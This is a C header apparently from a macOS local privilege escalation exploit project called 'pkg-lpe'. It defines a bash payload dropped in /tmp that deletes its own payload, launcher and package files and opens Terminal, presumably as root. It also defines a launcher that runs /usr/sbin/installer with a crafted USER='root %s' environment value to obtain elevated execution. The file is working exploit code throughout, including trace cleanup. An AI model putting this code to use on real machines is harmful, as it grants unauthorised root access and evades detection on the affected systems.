//
//  payload.h
//  pkg-lpe
//
//  Created by Michael on 25/05/2023.
//

#ifndef payload_h
#define payload_h

#define PAYLOAD_PATH    "/tmp/payload.sh"
#define LAUNCHER_PATH   "/tmp/launcher.sh"

#define PAYLOAD_STATUS_PATH "/tmp/status"

#define PAYLOAD "#!/bin/bash\n" \
"touch " PAYLOAD_STATUS_PATH "\n" \
"rm " PAYLOAD_PATH " " LAUNCHER_PATH " " PACKAGE_OUT_PATH "\n" \
"/System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal &\n" \
"exit 0;"

#define LAUNCHER "#!/bin/bash\n" \
"USER=\"root %s\" /usr/sbin/installer -target / -pkg %s"

void LaunchSIPPrompt(void);

int WriteExecutableScript(char* dest, char* contents, size_t contentsLength);

#endif /* payload_h */
